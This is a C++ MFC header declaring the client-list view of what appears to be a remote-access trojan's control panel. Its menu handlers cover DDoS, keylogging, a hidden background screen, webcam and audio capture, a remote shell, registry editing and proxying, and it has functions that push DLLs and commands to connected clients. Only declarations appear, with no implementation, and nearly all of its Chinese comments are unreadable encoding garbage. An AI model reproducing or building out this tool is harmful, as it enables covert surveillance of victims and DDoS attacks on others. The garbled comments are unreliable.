// QuickView.h : interface of the CQuickView class
//


#pragma once
#include "QuickDoc.h"


//
class CQuickView : public CXTPReportView
{
public:
	struct WorkInfo
	{
		BYTE* filedate;
		int filesize;
	};


	typedef std::map<CString, CXTPReportRecord*> ClienListDate; //���������+�б�pRecord 
	typedef std::map<CString, WorkInfo*> WorksDate; //�����������
protected: // create from serialization only
	CQuickView();
	

	DECLARE_DYNCREATE(CQuickView)

	// Attributes
public:
	CQuickDoc* GetDocument() const;
	CXTPReportSubListControl m_wndSubList;
	CXTPReportFilterEditControl m_wndFilterEdit;
	CDialogBar* m_wndFilterEditBar;     // Sample Filter editing window
	CImageList m_ilIcons;
	CXTPReportControl* wndReport;
	CXTPReportSelectedRows* p_ReportSelectedRows; //����ѡ����
	// Operations
public:

	// Overrides
public:
	virtual void OnDraw(CDC* pDC);  // overridden to draw this view
	virtual void OnInitialUpdate();
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);

	void SendSelectCommand(PBYTE pData, UINT nSize);   //ѡ�з����������
	void SendDll(LPCTSTR lpDllName, SENDTASK sendtask = TASK_MAIN); //������ͨ����DLL
	//void SendplugDll(LPCTSTR lpDllName); //����ֻ��Ҫ���ص�DLL
	//void SendDllAndCom(LPCTSTR lpDllName, LPCTSTR FunName, TCHAR* szcommand = _T(""), SENDTASK sendtask = TASK_DOEVERYTHING); //������ͨ����DLL

	void Clipboard(CString csClipboard);
protected:
	CXTPReportRow* m_pTopRow;
	CMenu mListmeau;
	CMenu mListmeau_copy;
	CMenu mListmeau_file;
	CMenu mListmeau_screen;
	CMenu mListmeau_Peripherals;
	CMenu mListmeau_ZJ;
	CMenu mListmeau_khd;
	CMenu mListmeau_hh;
	CMenu mListmeau_other;
	CMenu mListmeau_filter;
	int i_mListmeau_other_num;
	BYTE* R_g_Column_Data;
	ClienListDate m_ClienListDate; //����Ѱ��ʹ��
	ClienListDate::iterator it;

	time_t curTime;					//ʱ���ʼ��
	tm tm1;
	CLCS m_clcs;
	LOGININFO* LoginInfo;
	// 
	// Window
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSetFocus(CWnd* pOldWnd);
	afx_msg void OnDestroy();
	BOOL WriterReg();				//�����б���

	afx_msg void OnReportWatermark();//ˮӡ
	CXTPReportRecordItem* MainAddItem(CXTPReportRecord* pRecord, LPCTSTR szText, int ico_num);				//�����Ŀ ������
	CXTPReportRecordItem* MainChangeItem(CXTPReportRecord* pRecord, LPCTSTR szText, int ico_num, int index); //�޸���Ŀ

	afx_msg void OnShowGroup(NMHDR* pNotifyStruct, LRESULT* result);  //����ͷ����¼�
	afx_msg void OnShowFilterEditandOnShowFieldChooser(NMHDR* pNotifyStruct, LRESULT* result);  //����ͷ�Ҽ��¼�
	afx_msg void OnReportLButtonDown(NMHDR* pNotifyStruct, LRESULT* result);  //��������¼�
	afx_msg void OnReportDBLCLK(NMHDR* pNotifyStruct, LRESULT* result);  //�������˫���¼�
	afx_msg void OnReportItemRClick(NMHDR* pNotifyStruct, LRESULT* result);  //����ͷ�Ҽ��¼�
	afx_msg void OnReportGroupOrderChanged(NMHDR* pNotifyStruct, LRESULT* /*result*/); //�������¼�

	void HandlingRightClickMessages(int nitem); //���Ҽ��˵���Ϣ����

	afx_msg LRESULT OnAddtomainlist(WPARAM, LPARAM);   //�����������
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);	//����ɾ��

protected:

	



	
	afx_msg void OnMenuitemADDMONITOR();	//������

	afx_msg void OnMenuitemKE();			//�ͻ�����
	afx_msg void OnMenuitemDIAN();			//��Դ
	afx_msg void OnMenuitemCHA();			//���
	afx_msg void OnMenuitemDDOS();			//DDOS

	afx_msg void OnMenuitemFENZU();			//�޸ķ���
	afx_msg void OnMenuitemBEIZHU();		//�޸ı�ע

	afx_msg void OnMenuitemFILE();			//�ļ�����

	afx_msg void OnMenuitemDIFSCREEN();		//������Ļ
	afx_msg void OnMenuitemQUICKSCREEN();	//������Ļ
	afx_msg void OnMenuitemPLAY();			//������Ļ
	afx_msg void  OnMenuitemHIDESCREEN();	//��̨��Ļ

	afx_msg void  OnMenuitemSPEAK();		//���ż���
	afx_msg void  OnMenuitemAUDIO();		//��������
	afx_msg void   OnMenuitemWEBCAM();		//��Ƶ�鿴

	afx_msg void   OnMenuitemXITONG();		//ϵͳ����
	afx_msg void  OnMenuitemCMD();			//Զ���ն�
	afx_msg void  OnMenuitemKEYBOARD();		//���̼�¼
	afx_msg void   OnMenuitemREGEDIT();		//��ע���
	afx_msg void  OnMenuitemPROXY();		//����ӳ��
	afx_msg void   OnMenuitemCHAT();		//Զ�̽�̸






// Implementation
public:
	virtual ~CQuickView();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:

	// Generated message map functions
protected:
	DECLARE_MESSAGE_MAP()
};

#ifndef _DEBUG  // debug version in QuickView.cpp
inline CQuickDoc* CQuickView::GetDocument() const
{
	return reinterpret_cast<CQuickDoc*>(m_pDocument);
}
#endif



//////////////////////////////////////////////////////////////////////////
// Customized record item, used for displaying checkboxes.
class CMessageRecordItemCheck : public CXTPReportRecordItemText
{
	DECLARE_SERIAL(CMessageRecordItemCheck)
public:
	// Constructs record item with the initial checkbox value.
	CMessageRecordItemCheck(BOOL bCheck = FALSE);

	// Provides custom group captions depending on checkbox value.
	// Returns caption string ID to be read from application resources.
	virtual int GetGroupCaptionID(CXTPReportColumn* pColumn);

	// Provides custom records comparison by this item based on checkbox value, 
	// instead of based on captions.
	virtual int Compare(CXTPReportColumn* pColumn, CXTPReportRecordItem* pItem);
};




